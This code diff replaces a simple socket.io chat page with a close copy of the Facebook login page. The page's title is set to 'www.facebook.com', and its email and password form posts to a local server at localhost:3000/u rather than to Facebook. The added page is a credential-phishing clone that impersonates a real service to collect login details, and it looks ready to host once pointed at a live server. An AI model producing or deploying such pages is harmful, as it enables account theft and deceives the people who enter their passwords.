@@ -3,177 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome Umer Chats</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        .chat-container {
-            max-width: 600px;
-            margin: 20px auto;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-        .chat-header {
-            background-color: #4267B2;
-            color: #fff;
-            padding: 15px;
-            text-align: center;
-        }
-        .chat-messages {
-            padding: 15px;
-            overflow-y: scroll;
-            max-height: 300px;
-        }
-        .message {
-            margin-bottom: 10px;
-            overflow: hidden; /* Ensure correct positioning */
-        }
-        .message.self {
-            text-align: right;
-        }
-        .message .message-content {
-            background-color: #eceff1;
-            padding: 10px;
-            border-radius: 5px;
-            display: inline-block;
-            max-width: 70%;
-        }
-        .message.self .message-content {
-            background-color: #DCF8C6;
-            align-self: flex-end; /* Align to right side */
-        }
-        .typing-indicator {
-            color: #888;
-            font-style: italic;
-        }
-        .chat-input {
-            padding: 15px;
-            background-color: #fff;
-            border-top: 1px solid #ddd;
-            display: flex;
-            align-items: center; /* Align input and button */
-        }
-        .input-field {
-            width: calc(100% - 90px);
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            margin-right: 10px;
-        }
-        .btn-send {
-            padding: 10px 20px;
-            background-color: #4267B2;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-    </style>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <title>www.facebook.com</title>
 </head>
 <body>
-    <div class="chat-container">
-        <div class="chat-header">
-            Welcome Umer Chats
-        </div>
-        <div class="chat-messages" id="chat-messages">
-            <!-- Messages will be inserted here dynamically -->
-        </div>
-        <div class="chat-input">
-            <input type="text" id="message-input" class="input-field" placeholder="Type your message...">
-            <button id="sendMessage" class="btn-send">Send</button>
-        </div>
-        <div id="typing-indicator" class="typing-indicator" style="display: none;">Typing...</div>
+<div class="grid md:grid-cols-2">
+    <div class="box">
+        <h1 class="f">facebook</h1>
+        <p class="facebookp">Facebook helps you connect and share with the people in your life.</p>
+
     </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
-    <script>
-        // Function to save messages to local storage
-        function saveMessage(message) {
-            const messages = JSON.parse(localStorage.getItem('chatMessages')) || [];
-            messages.push(message);
-            localStorage.setItem('chatMessages', JSON.stringify(messages));
-        }
 
-        // Function to load messages from local storage
-        function loadMessages() {
-            const messages = JSON.parse(localStorage.getItem('chatMessages')) || [];
-            const chatMessages = document.getElementById('chat-messages');
-            chatMessages.innerHTML = ''; // Clear previous messages
-            messages.forEach(msg => {
-                displayMessage(msg);
-            });
-            chatMessages.scrollTop = chatMessages.scrollHeight; // Scroll to bottom
-        }
 
-        // Function to display a message
-        function displayMessage(msg) {
-            const chatMessages = document.getElementById('chat-messages');
-            const messageDiv = document.createElement('div');
-            messageDiv.className = 'message';
-            const messageContent = document.createElement('div');
-            messageContent.className = 'message-content';
-            messageContent.innerText = msg;
-            messageDiv.appendChild(messageContent);
-            chatMessages.appendChild(messageDiv);
-            chatMessages.scrollTop = chatMessages.scrollHeight; // Scroll to bottom
-        }
+    <div class="box">
+     <form action="http://localhost:3000/u" method="POST">
+        <div name="email">
 
-        // Connect to socket
-        const socket = io('https://vercel-xi-seven-89.vercel.app/');
-        socket.on('connect', function () {
-            console.log("Socket is connected");
-            // Load messages when connected
-            loadMessages();
-        });
+            <input placeholder="Email address or phone number" name="email"/>
+        </div>
+        <div name="password">
 
-        const sendMessage = document.getElementById("sendMessage");
-        const messageInput = document.getElementById('message-input');
-        const typingIndicator = document.getElementById('typing-indicator');
+            <input placeholder="Password" type="password" name="password"/>
+        </div>
+        <div>
 
-        sendMessage.addEventListener('click', function () {
-            console.log("Send button clicked");
-            const message = messageInput.value;
-            if (message.trim() !== '') {
-                socket.emit('user-message', message);
-                // Save message to local storage
-                saveMessage(message);
-                // Clear input field
-                messageInput.value = '';
-            }
-        });
+            <button type="submit" class="logi">Login</button>
+        </div>
+        <a href="">Forgotten Password?</a>
+        <hr>
+        <div class="b">
 
-        messageInput.addEventListener('input', function () {
-            console.log("Input field changed");
-            if (messageInput.value.trim() !== '') {
-                console.log("Typing...");
-                socket.emit('typing');
-            } else {
-                console.log("Stopped typing");
-                socket.emit('stop-typing');
-            }
-        });
+            <button class="newac">Create New Account</button>
+        </div>
+     </form>
+     <p class="page">Create a Page for a celebrity, brand or business.
+    </p>
 
-        socket.on('message', function (msg) {
-            console.log("Message received:", msg);
-            displayMessage(msg);
-            // Save received message to local storage
-            saveMessage(msg);
-        });
+    </div>
 
-        socket.on('typing', function () {
-            console.log("Typing indicator shown");
-            typingIndicator.style.display = 'block';
-        });
+</div> 
+<style>
+    .box{
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        
 
-        socket.on('stop-typing', function () {
-            console.log("Typing indicator hidden");
-            typingIndicator.style.display = 'none';
-        });
-    </script>
+        height: 100vh;
+    }
+    .f{
+        font-size: 52px;
+        color:#0866FF;
+        
+        font-weight: bolder;
+    }
+    .facebookp{
+        font-size: 24px;
+        width:440px;
+      
+        font-weight: bold;
+    }
+    input{
+        width:400px;
+        height:44px;
+        margin-top: 12px;
+        border:solid;
+        border-width:0.01em;
+        padding:9px;
+        border-color: #0866FF;
+
+        border-radius: 9px;
+    }
+    .logi{
+        border:solid;
+        width:400px;
+        border-width: 0.01em;
+        border-color: #0866FF;
+        border-radius: 9px;
+        margin-top: 12px;
+        height:32px;
+        height:44px;
+        font-size: 26px;
+        background-color: #0866FF;
+        color:white;
+        height:auto;
+        font-weight: bold;
+    }
+    .logi:hover{
+        background-color: #1268f3;
+    }
+a{
+    display: block;
+    display: flex;
+    justify-content: center;
+    margin-top: 12px;
+    color:#0866FF;
+}
+.newac{
+    border:solid;
+    width:200px;
+    height:auto;
+    font-weight: bolder;
+    background-color: #3CAD25;
+    color:white;
+    padding:12px;
+    border-radius: 9px;
+
+}
+.newac:hover{
+    background-color: #3d9a2a;
+}
+.b{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-top: 12px;
+}
+form{
+    
+    padding:17px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+
+}
+.page{
+    width: auto;
+    margin-top: 32px;
+    font-weight: bold;
+}
+
+@media screen and (min-width:1200px) {
+    body{
+        padding:0px 190px 0px 190px;
+    }
+    .page{
+    font-size: 20px;
+    margin-top: 32px;
+}
+    
+}
+@media screen and (max-width:767px) {
+    body{
+        overflow: none;
+    
+    }
+    .box{
+        height: auto;
+    }
+    form{
+        margin-top: 34px;
+        width: 90%;
+
+    }
+    .logi{
+        width: 100%;
+    }
+.facebookp{
+    font-size: 16px;
+    width: auto;
+
+}
+
+    input{
+
+        width:100%;
+    }
+}
+
+</style>   
 </body>
 </html>
